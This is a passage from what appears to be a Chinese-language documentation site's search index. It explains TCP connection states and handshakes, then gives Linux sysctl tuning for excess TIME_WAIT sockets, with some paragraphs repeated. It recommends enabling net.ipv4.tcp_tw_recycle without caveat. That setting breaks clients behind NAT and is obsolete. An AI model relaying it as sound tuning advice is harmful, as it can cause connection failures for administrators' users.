FIN_WAIT_1\uff1a\u8fd9\u4e2a\u72b6\u6001\u8981\u597d\u597d\u89e3\u91ca\u4e00\u4e0b\uff0c\u5176\u5b9eFIN_WAIT_1\u548cFIN_WAIT_2\u72b6\u6001\u7684\u771f\u6b63\u542b\u4e49\u90fd\u662f\u8868\u793a\u7b49\u5f85\u5bf9\u65b9\u7684FIN\u62a5\u6587\u3002\u800c\u8fd9\u4e24\u79cd\u72b6\u6001\u7684\u533a\u522b\u662f\uff1aFIN_WAIT_1\u72b6\u6001\u5b9e\u9645\u4e0a\u662f\u5f53SOCKET\u5728ESTABLISHED\u72b6\u6001\u65f6\uff0c\u5b83\u60f3\u4e3b\u52a8\u5173\u95ed\u8fde\u63a5\uff0c\u5411\u5bf9\u65b9\u53d1\u9001\u4e86FIN\u62a5\u6587\uff0c\u6b64\u65f6\u8be5SOCKET\u5373\u8fdb\u5165\u5230FIN_WAIT_1\u72b6\u6001\u3002\u800c\u5f53\u5bf9\u65b9\u56de\u5e94ACK\u62a5\u6587\u540e\uff0c\u5219\u8fdb\u5165\u5230FIN_WAIT_2\u72b6\u6001\uff0c\u5f53\u7136\u5728\u5b9e\u9645\u7684\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u65e0\u8bba\u5bf9\u65b9\u4f55\u79cd\u60c5\u51b5\u4e0b\uff0c\u90fd\u5e94\u8be5\u9a6c\u4e0a\u56de\u5e94ACK\u62a5\u6587\uff0c\u6240\u4ee5FIN_WAIT_1\u72b6\u6001\u4e00\u822c\u662f\u6bd4\u8f83\u96be\u89c1\u5230\u7684\uff0c\u800cFIN_WAIT_2\u72b6\u6001\u8fd8\u6709\u65f6\u5e38\u5e38\u53ef\u4ee5\u7528netstat\u770b\u5230\u3002 FIN_WAIT_2\uff1a\u4e0a\u9762\u5df2\u7ecf\u8be6\u7ec6\u89e3\u91ca\u4e86\u8fd9\u79cd\u72b6\u6001\uff0c\u5b9e\u9645\u4e0aFIN_WAIT_2\u72b6\u6001\u4e0b\u7684SOCKET\uff0c\u8868\u793a\u534a\u8fde\u63a5\uff0c\u4e5f\u5373\u6709\u4e00\u65b9\u8981\u6c42close\u8fde\u63a5\uff0c\u4f46\u53e6\u5916\u8fd8\u544a\u8bc9\u5bf9\u65b9\uff0c\u6211\u6682\u65f6\u8fd8\u6709\u70b9\u6570\u636e\u9700\u8981\u4f20\u9001\u7ed9\u4f60\uff0c\u7a0d\u540e\u518d\u5173\u95ed\u8fde\u63a5\u3002 TIME_WAIT\uff1a\u8868\u793a\u6536\u5230\u4e86\u5bf9\u65b9\u7684FIN\u62a5\u6587\uff0c\u5e76\u53d1\u9001\u51fa\u4e86ACK\u62a5\u6587\uff0c\u5c31\u7b492MSL\u540e\u5373\u53ef\u56de\u5230CLOSED\u53ef\u7528\u72b6\u6001\u4e86\u3002\u5982\u679cFIN_WAIT_1\u72b6\u6001\u4e0b\uff0c\u6536\u5230\u4e86\u5bf9\u65b9\u540c\u65f6\u5e26FIN\u6807\u5fd7\u548cACK\u6807\u5fd7\u7684\u62a5\u6587\u65f6\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u5230TIME_WAIT\u72b6\u6001\uff0c\u800c\u65e0\u987b\u7ecf\u8fc7FIN_WAIT_2\u72b6\u6001\u3002 \u6ce8:MSL(\u6700\u5927\u5206\u6bb5\u751f\u5b58\u671f)\u6307\u660eTCP\u62a5\u6587\u5728Internet\u4e0a\u6700\u957f\u751f\u5b58\u65f6\u95f4,\u6bcf\u4e2a\u5177\u4f53\u7684TCP\u5b9e\u73b0\u90fd\u5fc5\u987b\u9009\u62e9\u4e00\u4e2a\u786e\u5b9a\u7684MSL\u503c.RFC 1122\u5efa\u8bae\u662f2\u5206\u949f,\u4f46BSD\u4f20\u7edf\u5b9e\u73b0\u91c7\u7528\u4e8630\u79d2.TIME_WAIT \u72b6\u6001\u6700\u5927\u4fdd\u6301\u65f6\u95f4\u662f2 * MSL,\u4e5f\u5c31\u662f1-4\u5206\u949f. CLOSING\uff1a\u8fd9\u79cd\u72b6\u6001\u6bd4\u8f83\u7279\u6b8a\uff0c\u5b9e\u9645\u60c5\u51b5\u4e2d\u5e94\u8be5\u662f\u5f88\u5c11\u89c1\uff0c\u5c5e\u4e8e\u4e00\u79cd\u6bd4\u8f83\u7f55\u89c1\u7684\u4f8b\u5916\u72b6\u6001\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5f53\u4f60\u53d1\u9001FIN\u62a5\u6587\u540e\uff0c\u6309\u7406\u6765\u8bf4\u662f\u5e94\u8be5\u5148\u6536\u5230\uff08\u6216\u540c\u65f6\u6536\u5230\uff09\u5bf9\u65b9\u7684ACK\u62a5\u6587\uff0c\u518d\u6536\u5230\u5bf9\u65b9\u7684FIN\u62a5\u6587\u3002\u4f46\u662fCLOSING\u72b6\u6001\u8868\u793a\u4f60\u53d1\u9001FIN\u62a5\u6587\u540e\uff0c\u5e76\u6ca1\u6709\u6536\u5230\u5bf9\u65b9\u7684ACK\u62a5\u6587\uff0c\u53cd\u800c\u5374\u4e5f\u6536\u5230\u4e86\u5bf9\u65b9\u7684FIN\u62a5\u6587\u3002\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4f1a\u51fa\u73b0\u6b64\u79cd\u60c5\u51b5\u5462\uff1f\u5176\u5b9e\u7ec6\u60f3\u4e00\u4e0b\uff0c\u4e5f\u4e0d\u96be\u5f97\u51fa\u7ed3\u8bba\uff1a\u90a3\u5c31\u662f\u5982\u679c\u53cc\u65b9\u51e0\u4e4e\u5728\u540c\u65f6close\u4e00\u4e2aSOCKET\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u51fa\u73b0\u4e86\u53cc\u65b9\u540c\u65f6\u53d1\u9001FIN\u62a5\u6587\u7684\u60c5\u51b5\uff0c\u4e5f\u5373\u4f1a\u51fa\u73b0CLOSING\u72b6\u6001\uff0c\u8868\u793a\u53cc\u65b9\u90fd\u6b63\u5728\u5173\u95edSOCKET\u8fde\u63a5\u3002 CLOSE_WAIT\uff1a\u8fd9\u79cd\u72b6\u6001\u7684\u542b\u4e49\u5176\u5b9e\u662f\u8868\u793a\u5728\u7b49\u5f85\u5173\u95ed\u3002\u600e\u4e48\u7406\u89e3\u5462\uff1f\u5f53\u5bf9\u65b9close\u4e00\u4e2aSOCKET\u540e\u53d1\u9001FIN\u62a5\u6587\u7ed9\u81ea\u5df1\uff0c\u4f60\u7cfb\u7edf\u6beb\u65e0\u7591\u95ee\u5730\u4f1a\u56de\u5e94\u4e00\u4e2aACK\u62a5\u6587\u7ed9\u5bf9\u65b9\uff0c\u6b64\u65f6\u5219\u8fdb\u5165\u5230CLOSE_WAIT\u72b6\u6001\u3002\u63a5\u4e0b\u6765\u5462\uff0c\u5b9e\u9645\u4e0a\u4f60\u771f\u6b63\u9700\u8981\u8003\u8651\u7684\u4e8b\u60c5\u662f\u5bdf\u770b\u4f60\u662f\u5426\u8fd8\u6709\u6570\u636e\u53d1\u9001\u7ed9\u5bf9\u65b9\uff0c\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u90a3\u4e48\u4f60\u4e5f\u5c31\u53ef\u4ee5close\u8fd9\u4e2aSOCKET\uff0c\u53d1\u9001FIN\u62a5\u6587\u7ed9\u5bf9\u65b9\uff0c\u4e5f\u5373\u5173\u95ed\u8fde\u63a5\u3002\u6240\u4ee5\u4f60\u5728CLOSE_WAIT\u72b6\u6001\u4e0b\uff0c\u9700\u8981\u5b8c\u6210\u7684\u4e8b\u60c5\u662f\u7b49\u5f85\u4f60\u53bb\u5173\u95ed\u8fde\u63a5\u3002 LAST_ACK\uff1a\u8fd9\u4e2a\u72b6\u6001\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u597d\u7406\u89e3\u7684\uff0c\u5b83\u662f\u88ab\u52a8\u5173\u95ed\u4e00\u65b9\u5728\u53d1\u9001FIN\u62a5\u6587\u540e\uff0c\u6700\u540e\u7b49\u5f85\u5bf9\u65b9\u7684ACK\u62a5\u6587\u3002\u5f53\u6536\u5230ACK\u62a5\u6587\u540e\uff0c\u4e5f\u5373\u53ef\u4ee5\u8fdb\u5165\u5230CLOSED\u53ef\u7528\u72b6\u6001\u4e86\u3002 \u6700\u540e\u67092\u4e2a\u95ee\u9898\u7684\u56de\u7b54\uff0c\u6211\u81ea\u5df1\u5206\u6790\u540e\u7684\u7ed3\u8bba\uff08\u4e0d\u4e00\u5b9a\u4fdd\u8bc1100%\u6b63\u786e\uff09 1\u3001 \u4e3a\u4ec0\u4e48\u5efa\u7acb\u8fde\u63a5\u534f\u8bae\u662f\u4e09\u6b21\u63e1\u624b\uff0c\u800c\u5173\u95ed\u8fde\u63a5\u5374\u662f\u56db\u6b21\u63e1\u624b\u5462\uff1f \u8fd9\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u7684LISTEN\u72b6\u6001\u4e0b\u7684SOCKET\u5f53\u6536\u5230SYN\u62a5\u6587\u7684\u5efa\u8fde\u8bf7\u6c42\u540e\uff0c\u5b83\u53ef\u4ee5\u628aACK\u548cSYN\uff08ACK\u8d77\u5e94\u7b54\u4f5c\u7528\uff0c\u800cSYN\u8d77\u540c\u6b65\u4f5c\u7528\uff09\u653e\u5728\u4e00\u4e2a\u62a5\u6587\u91cc\u6765\u53d1\u9001\u3002\u4f46\u5173\u95ed\u8fde\u63a5\u65f6\uff0c\u5f53\u6536\u5230\u5bf9\u65b9\u7684FIN\u62a5\u6587\u901a\u77e5\u65f6\uff0c\u5b83\u4ec5\u4ec5\u8868\u793a\u5bf9\u65b9\u6ca1\u6709\u6570\u636e\u53d1\u9001\u7ed9\u4f60\u4e86\uff1b\u4f46\u672a\u5fc5\u4f60\u6240\u6709\u7684\u6570\u636e\u90fd\u5168\u90e8\u53d1\u9001\u7ed9\u5bf9\u65b9\u4e86\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u672a\u5fc5\u4f1a\u9a6c\u4e0a\u4f1a\u5173\u95edSOCKET,\u4e5f\u5373\u4f60\u53ef\u80fd\u8fd8\u9700\u8981\u53d1\u9001\u4e00\u4e9b\u6570\u636e\u7ed9\u5bf9\u65b9\u4e4b\u540e\uff0c\u518d\u53d1\u9001FIN\u62a5\u6587\u7ed9\u5bf9\u65b9\u6765\u8868\u793a\u4f60\u540c\u610f\u73b0\u5728\u53ef\u4ee5\u5173\u95ed\u8fde\u63a5\u4e86\uff0c\u6240\u4ee5\u5b83\u8fd9\u91cc\u7684ACK\u62a5\u6587\u548cFIN\u62a5\u6587\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662f\u5206\u5f00\u53d1\u9001\u7684\u3002 2\u3001 \u4e3a\u4ec0\u4e48TIME_WAIT\u72b6\u6001\u8fd8\u9700\u8981\u7b492MSL\u540e\u624d\u80fd\u8fd4\u56de\u5230CLOSED\u72b6\u6001\uff1f \u8fd9\u662f\u56e0\u4e3a\uff1a\u867d\u7136\u53cc\u65b9\u90fd\u540c\u610f\u5173\u95ed\u8fde\u63a5\u4e86\uff0c\u800c\u4e14\u63e1\u624b\u76844\u4e2a\u62a5\u6587\u4e5f\u90fd\u534f\u8c03\u548c\u53d1\u9001\u5b8c\u6bd5\uff0c\u6309\u7406\u53ef\u4ee5\u76f4\u63a5\u56de\u5230CLOSED\u72b6\u6001\uff08\u5c31\u597d\u6bd4\u4eceSYN_SEND\u72b6\u6001\u5230ESTABLISH\u72b6\u6001\u90a3\u6837\uff09\uff1b\u4f46\u662f\u56e0\u4e3a\u6211\u4eec\u5fc5\u987b\u8981\u5047\u60f3\u7f51\u7edc\u662f\u4e0d\u53ef\u9760\u7684\uff0c\u4f60\u65e0\u6cd5\u4fdd\u8bc1\u4f60\u6700\u540e\u53d1\u9001\u7684ACK\u62a5\u6587\u4f1a\u4e00\u5b9a\u88ab\u5bf9\u65b9\u6536\u5230\uff0c\u56e0\u6b64\u5bf9\u65b9\u5904\u4e8eLAST_ACK\u72b6\u6001\u4e0b\u7684SOCKET\u53ef\u80fd\u4f1a\u56e0\u4e3a\u8d85\u65f6\u672a\u6536\u5230ACK\u62a5\u6587\uff0c\u800c\u91cd\u53d1FIN\u62a5\u6587\uff0c\u6240\u4ee5\u8fd9\u4e2aTIME_WAIT\u72b6\u6001\u7684\u4f5c\u7528\u5c31\u662f\u7528\u6765\u91cd\u53d1\u53ef\u80fd\u4e22\u5931\u7684ACK\u62a5\u6587\uff0c\u5e76\u4fdd\u8bc1\u4e8e\u6b64\u3002 \u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u4e0b\u6240\u6709\u8fde\u63a5\u72b6\u6001\u7684\u6570\uff1a [root@vps ~]#netstat -n|awk '/^tcp/{++S[$NF]}END{for (key in S) print key,S[key]}' TIME_WAIT 286 FIN_WAIT1 5 FIN_WAIT2 6 ESTABLISHED 269 SYN_RECV 5 CLOSING 1 \u5982\u53d1\u73b0\u7cfb\u7edf\u5b58\u5728\u5927\u91cfTIME_WAIT\u72b6\u6001\u7684\u8fde\u63a5\uff0c\u901a\u8fc7\u8c03\u6574\u5185\u6838\u53c2\u6570\u89e3\u51b3\uff1a \u7f16\u8f91\u6587\u4ef6/etc/sysctl.conf\uff0c\u52a0\u5165\u4ee5\u4e0b\u5185\u5bb9\uff1a net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 net.ipv4.tcp_fin_timeout = 30 \u7136\u540e\u6267\u884c /sbin/sysctl -p \u8ba9\u53c2\u6570\u751f\u6548\u3002 net.ipv4.tcp_syncookies = 1 \u8868\u793a\u5f00\u542fSYN Cookies\u3002\u5f53\u51fa\u73b0SYN\u7b49\u5f85\u961f\u5217\u6ea2\u51fa\u65f6\uff0c\u542f\u7528cookies\u6765\u5904\u7406\uff0c\u53ef\u9632\u8303\u5c11\u91cfSYN\u653b\u51fb\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_reuse = 1 \u8868\u793a\u5f00\u542f\u91cd\u7528\u3002\u5141\u8bb8\u5c06TIME-WAIT sockets\u91cd\u65b0\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_recycle = 1 \u8868\u793a\u5f00\u542fTCP\u8fde\u63a5\u4e2dTIME-WAIT sockets\u7684\u5feb\u901f\u56de\u6536\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\u3002 net.ipv4.tcp_fin_timeout \u4fee\u6539\u7cfb\u9ed8\u8ba4\u7684 TIMEOUT \u65f6\u95f4 \u5176\u5b83\u53c2\u6570\u8bf4\u660e\uff1a net.ipv4.tcp_syncookies = 1 \u8868\u793a\u5f00\u542fSYN Cookies\u3002\u5f53\u51fa\u73b0SYN\u7b49\u5f85\u961f\u5217\u6ea2\u51fa\u65f6\uff0c\u542f\u7528cookies\u6765\u5904\u7406\uff0c\u53ef\u9632\u8303\u5c11\u91cfSYN\u653b\u51fb\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_reuse = 1 \u8868\u793a\u5f00\u542f\u91cd\u7528\u3002\u5141\u8bb8\u5c06TIME-WAIT sockets\u91cd\u65b0\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\uff1b net.ipv4.tcp_tw_recycle = 1 \u8868\u793a\u5f00\u542fTCP\u8fde\u63a5\u4e2dTIME-WAIT sockets\u7684\u5feb\u901f\u56de\u6536\uff0c\u9ed8\u8ba4\u4e3a0\uff0c\u8868\u793a\u5173\u95ed\u3002 net.ipv4.tcp_fin_timeout = 30 \u8868\u793a\u5982\u679c\u5957\u63a5\u5b57\u7531\u672c\u7aef\u8981\u6c42\u5173\u95ed\uff0c\u8fd9\u4e2a\u53c2\u6570\u51b3\u5b9a\u4e86\u5b83\u4fdd\u6301\u5728FIN-WAIT-2\u72b6\u6001\u7684\u65f6\u95f4\u3002 net.ipv4.tcp_keepalive_time = 1200 \u8868\u793a\u5f53keepalive\u8d77\u7528\u7684\u65f6\u5019\uff0cTCP\u53d1\u9001keepalive\u6d88\u606f\u7684\u9891\u5ea6\u3002\u7f3a\u7701\u662f2\u5c0f\u65f6\uff0c\u6539\u4e3a20\u5206\u949f\u3002 net.ipv4.ip_local_port_range = 1024 65000 \u8868\u793a\u7528\u4e8e\u5411\u5916\u8fde\u63a5\u7684\u7aef\u53e3\u8303\u56f4\u3002\u7f3a\u7701\u60c5\u51b5\u4e0b\u5f88\u5c0f\uff1a32768\u523061000\uff0c\u6539\u4e3a1024\u523065000\u3002 net.ipv4.tcp_max_syn_backlog = 8192 \u8868\u793aSYN\u961f\u5217\u7684\u957f\u5ea6\uff0c\u9ed8\u8ba4\u4e3a1024\uff0c\u52a0\u5927\u961f\u5217\u957f\u5ea6\u4e3a8192\uff0c\u53ef\u4ee5\u5bb9\u7eb3\u66f4\u591a\u7b49\u5f85\u8fde\u63a5\u7684\u7f51\u7edc\u8fde\u63a5\u6570\u3002 net.ipv4.tcp_max_tw_buckets = 5000 \u8868\u793a\u7cfb\u7edf\u540c\u65f6\u4fdd\u6301TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u5982\u679c\u8d85\u8fc7\u8fd9\u4e2a\u6570\u5b57\uff0cTIME_WAIT\u5957\u63a5\u5b57\u5c06\u7acb\u523b\u88ab\u6e05\u9664\u5e76\u6253\u5370\u8b66\u544a\u4fe1\u606f\u3002\u9ed8\u8ba4\u4e3a180000\uff0c\u6539\u4e3a5000\u3002\u5bf9\u4e8eApache\u3001Nginx\u7b49\u670d\u52a1\u5668\uff0c\u4e0a\u51e0\u884c\u7684\u53c2\u6570\u53ef\u4ee5\u5f88\u597d\u5730\u51cf\u5c11TIME_WAIT\u5957\u63a5\u5b57\u6570\u91cf\uff0c\u4f46\u662f\u5bf9\u4e8eSquid\uff0c\u6548\u679c\u5374\u4e0d\u5927\u3002\u6b64\u9879\u53c2\u6570\u53ef\u4ee5\u63a7\u5236TIME_WAIT\u5957\u63a5\u5b57\u7684\u6700\u5927\u6570\u91cf\uff0c\u907f\u514dSquid\u670d\u52a1\u5668\u88ab\u5927\u91cf\u7684TIME_WAIT\u5957\u63a5\u5b57\u62d6\u6b7b\u3002 \u6ce8: net.ipv4.tcp_tw_reuse = 1 net.ipv4.tcp_tw_recycle = 1 \u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u53c2\u6570\uff1a reuse\u662f\u8868\u793a\u662f\u5426\u5141\u8bb8\u91cd\u65b0\u5e94\u7528\u5904\u4e8eTIME-WAIT\u72b6\u6001\u7684socket\u7528\u4e8e\u65b0\u7684TCP\u8fde\u63a5 recyse\u662f\u52a0\u901fTIME-WAIT sockets\u56de\u6536","title":"TIME_WAIT\u8fc7\u591a\u7684\u89e3\u51b3\u65b9\u6cd5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/time_wait/#time_wait","text":"\u4e0a\u56fe\u5bf9\u6392\u9664\u548c\u5b9a\u4f4d\u7f51\u7edc\u6216\u7cfb\u7edf\u6545\u969c\u65f6\u5927\u6709\u5e2e\u52a9\uff0c\u4f46\u662f\u600e\u6837\u7262\u7262\u5730\u5c06\u8fd9\u5f20\u56fe\u523b\u5728\u8111\u4e2d\u5462\uff1f\u90a3\u4e48\u4f60\u5c31\u4e00\u5b9a\u8981\u5bf9\u8fd9\u5f20\u56fe\u7684\u6bcf\u4e00\u4e2a\u72b6\u6001\uff0c\u53ca\u8f6c\u6362\u7684\u8fc7\u7a0b\u6709\u6df1\u523b\u5730\u8ba4\u8bc6\uff0c\u4e0d\u80fd\u53ea\u505c\u7559\u5728\u4e00\u77e5\u534a\u89e3\u4e4b\u4e2d\u3002\u4e0b\u9762\u5bf9\u8fd9\u5f20\u56fe\u768411\u79cd\u72b6\u6001\u8be6\u7ec6\u89e3\u91ca\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u52a0\u5f3a\u8bb0\u5fc6\uff01\u4e0d\u8fc7\u5728\u8fd9\u4e4b\u524d\uff0c\u5148\u56de\u987e\u4e00\u4e0bTCP\u5efa\u7acb\u8fde\u63a5\u7684\u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b\uff0c\u4ee5\u53ca\u5173\u95ed\u8fde\u63a5\u7684\u56db\u6b21\u63e1\u624b\u8fc7\u7a0b\u3002","title":"TIME_WAIT\u8fc7\u591a\u7684\u89e3\u51b3\u65b9\u6cd5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/time_wait/#1","text":"\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2a\u5e26SYN\u6807\u5fd7\u7684TCP\u62a5\u6587\u5230\u670d\u52a1\u5668\u3002\u8fd9\u662f\u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b\u4e2d\u7684\u62a5\u65871\u3002 \u670d\u52a1\u5668\u7aef\u56de\u5e94\u5ba2\u6237\u7aef\u7684\uff0c\u8fd9\u662f\u4e09\u6b21\u63e1\u624b\u4e2d\u7684\u7b2c2\u4e2a\u62a5\u6587\uff0c\u8fd9\u4e2a\u62a5\u6587\u540c\u65f6\u5e26ACK\u6807\u5fd7\u548cSYN\u6807\u5fd7\u3002\u56e0\u6b64\u5b83\u8868\u793a\u5bf9\u521a\u624d\u5ba2\u6237\u7aefSYN\u62a5\u6587\u7684\u56de\u5e94\uff1b\u540c\u65f6\u53c8\u6807\u5fd7SYN\u7ed9\u5ba2\u6237\u7aef\uff0c\u8be2\u95ee\u5ba2\u6237\u7aef\u662f\u5426\u51c6\u5907\u597d\u8fdb\u884c\u6570\u636e\u901a\u8baf\u3002 \u5ba2\u6237\u5fc5\u987b\u518d\u6b21\u56de\u5e94\u670d\u52a1\u6bb5\u4e00\u4e2aACK\u62a5\u6587\uff0c\u8fd9\u662f\u62a5\u6587\u6bb53\u3002","title":"1\u3001\u5efa\u7acb\u8fde\u63a5\u534f\u8bae\uff08\u4e09\u6b21\u63e1\u624b\uff09"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/time_wait/#2","text":"\u7531\u4e8eTCP\u8fde\u63a5\u662f\u5168\u53cc\u5de5\u7684\uff0c\u56e0\u6b64\u6bcf\u4e2a\u65b9\u5411\u90fd\u5fc5\u987b\u5355\u72ec\u8fdb\u884c\u5173\u95ed\u3002\u8fd9\u539f\u5219\u662f\u5f53\u4e00\u65b9\u5b8c\u6210\u5b83\u7684\u6570\u636e\u53d1\u9001\u4efb\u52a1\u540e\u5c31\u80fd\u53d1\u9001\u4e00\u4e2aFIN\u6765\u7ec8\u6b62\u8fd9\u4e2a\u65b9\u5411\u7684\u8fde\u63a5\u3002\u6536\u5230\u4e00\u4e2a FIN\u53ea\u610f\u5473\u7740\u8fd9\u4e00\u65b9\u5411\u4e0a\u6ca1\u6709\u6570\u636e\u6d41\u52a8\uff0c\u4e00\u4e2aTCP\u8fde\u63a5\u5728\u6536\u5230\u4e00\u4e2aFIN\u540e\u4ecd\u80fd\u53d1\u9001\u6570\u636e\u3002\u9996\u5148\u8fdb\u884c\u5173\u95ed\u7684\u4e00\u65b9\u5c06\u6267\u884c\u4e3b\u52a8\u5173\u95ed\uff0c\u800c\u53e6\u4e00\u65b9\u6267\u884c\u88ab\u52a8\u5173\u95ed\u3002 TCP\u5ba2\u6237\u7aef\u53d1\u9001\u4e00\u4e2aFIN\uff0c\u7528\u6765\u5173\u95ed\u5ba2\u6237\u5230\u670d\u52a1\u5668\u7684\u6570\u636e\u4f20\u9001\uff08\u62a5\u6587\u6bb54\uff09\u3002 \u670d\u52a1\u5668\u6536\u5230\u8fd9\u4e2aFIN\uff0c\u5b83\u53d1\u56de\u4e00\u4e2aACK\uff0c\u786e\u8ba4\u5e8f\u53f7\u4e3a\u6536\u5230\u7684\u5e8f\u53f7\u52a01\uff08\u62a5\u6587\u6bb55\uff09\u3002\u548cSYN\u4e00\u6837\uff0c\u4e00\u4e2aFIN\u5c06\u5360\u7528\u4e00\u4e2a\u5e8f\u53f7\u3002 \u670d\u52a1\u5668\u5173\u95ed\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff0c\u53d1\u9001\u4e00\u4e2aFIN\u7ed9\u5ba2\u6237\u7aef\uff08\u62a5\u6587\u6bb56\uff09\u3002 \u5ba2\u6237\u6bb5\u53d1\u56deACK\u62a5\u6587\u786e\u8ba4\uff0c\u5e76\u5c06\u786e\u8ba4\u5e8f\u53f7\u8bbe\u7f6e\u4e3a\u6536\u5230\u5e8f\u53f7\u52a01\uff08\u62a5\u6587\u6bb57\uff09\u3002 CLOSED\uff1a\u8fd9\u4e2a\u6ca1\u4ec0\u4e48\u597d\u8bf4\u7684\u4e86\uff0c\u8868\u793a\u521d\u59cb\u72b6\u6001\u3002 LISTEN\uff1a\u8fd9\u4e2a\u4e5f\u662f\u975e\u5e38\u5bb9\u6613\u7406\u89e3\u7684\u4e00\u4e2a\u72b6\u6001\uff0c\u8868\u793a\u670d\u52a1\u5668\u7aef\u7684\u67d0\u4e2aSOCKET\u5904\u4e8e\u76d1\u542c\u72b6\u6001\uff0c\u53ef\u4ee5\u63a5\u53d7\u8fde\u63a5\u4e86\u3002 SYN_RCVD\uff1a\u8fd9\u4e2a\u72b6\u6001\u8868\u793a\u63a5\u53d7\u5230\u4e86SYN\u62a5\u6587\uff0c\u5728\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u72b6\u6001\u662f\u670d\u52a1\u5668\u7aef\u7684SOCKET\u5728\u5efa\u7acbTCP\u8fde\u63a5\u65f6\u7684\u4e09\u6b21\u63e1\u624b\u4f1a\u8bdd\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e2a\u4e2d\u95f4\u72b6\u6001\uff0c\u5f88\u77ed\u6682\uff0c\u57fa\u672c\u4e0a\u7528netstat\u4f60\u662f\u5f88\u96be\u770b\u5230\u8fd9\u79cd\u72b6\u6001\u7684\uff0c\u9664\u975e\u4f60\u7279\u610f\u5199\u4e86\u4e00\u4e2a\u5ba2\u6237\u7aef\u6d4b\u8bd5\u7a0b\u5e8f\uff0c\u6545\u610f\u5c06\u4e09\u6b21TCP\u63e1\u624b\u8fc7\u7a0b\u4e2d\u6700\u540e\u4e00\u4e2aACK\u62a5\u6587\u4e0d\u4e88\u53d1\u9001\u3002\u56e0\u6b64\u8fd9\u79cd\u72b6\u6001\u65f6\uff0c\u5f53\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u62a5\u6587\u540e\uff0c\u5b83\u4f1a\u8fdb\u5165\u5230ESTABLISHED\u72b6\u6001\u3002 SYN_SENT\uff1a\u8fd9\u4e2a\u72b6\u6001\u4e0eSYN_RCVD\u9065\u60f3\u547c\u5e94\uff0c\u5f53\u5ba2\u6237\u7aefSOCKET\u6267\u884cCONNECT\u8fde\u63a5\u65f6\uff0c\u5b83\u9996\u5148\u53d1\u9001SYN\u62a5\u6587\uff0c\u56e0\u6b64\u4e5f\u968f\u5373\u5b83\u4f1a\u8fdb\u5165\u5230\u4e86SYN_SENT\u72b6\u6001\uff0c\u5e76\u7b49\u5f85\u670d\u52a1\u7aef\u7684\u53d1\u9001\u4e09\u6b21\u63e1\u624b\u4e2d\u7684\u7b2c2\u4e2a\u62a5\u6587\u3002SYN_SENT\u72b6\u6001\u8868\u793a\u5ba2\u6237\u7aef\u5df2\u53d1\u9001SYN\u62a5\u6587\u3002 ESTABLISHED\uff1a\u8fd9\u4e2a\u5bb9\u6613\u7406\u89e3\u4e86\uff0c\u8868\u793a\u8fde\u63a5\u5df2\u7ecf\u5efa\u7acb\u4e86\u3002 FIN_WAIT_1\uff1a\u8fd9\u4e2a\u72b6\u6001\u8981\u597d\u597d\u89e3\u91ca\u4e00\u4e0b\uff0c\u5176\u5b9eFIN_WAIT_1\u548cFIN_WAIT_2\u72b6\u6001\u7684\u771f\u6b63\u542b\u4e49\u90fd\u662f\u8868\u793a\u7b49\u5f85\u5bf9\u65b9\u7684FIN\u62a5\u6587\u3002\u800c\u8fd9\u4e24\u79cd\u72b6\u6001\u7684\u533a\u522b\u662f\uff1aFIN_WAIT_1\u72b6\u6001\u5b9e\u9645\u4e0a\u662f\u5f53SOCKET\u5728ESTABLISHED\u72b6\u6001\u65f6\uff0c\u5b83\u60f3\u4e3b\u52a8\u5173\u95ed\u8fde\u63a5\uff0c\u5411\u5bf9\u65b9\u53d1\u9001\u4e86FIN\u62a5\u6587\uff0c\u6b64\u65f6\u8be5SOCKET\u5373\u8fdb\u5165\u5230FIN_WAIT_1\u72b6\u6001\u3002\u800c\u5f53\u5bf9\u65b9\u56de\u5e94ACK\u62a5\u6587\u540e\uff0c\u5219\u8fdb\u5165\u5230FIN_WAIT_2\u72b6\u6001\uff0c\u5f53\u7136\u5728\u5b9e\u9645\u7684\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u65e0\u8bba\u5bf9\u65b9\u4f55\u79cd\u60c5\u51b5\u4e0b\uff0c\u90fd\u5e94\u8be5\u9a6c\u4e0a\u56de\u5e94ACK\u62a5\u6587\uff0c\u6240\u4ee5FIN_WAIT_1\u72b6\u6001\u4e00\u822c\u662f\u6bd4\u8f83\u96be\u89c1\u5230\u7684\uff0c\u800cFIN_WAIT_2\u72b6\u6001\u8fd8\u6709\u65f6\u5e38\u5e38\u53ef\u4ee5\u7528netstat\u770b\u5230\u3002 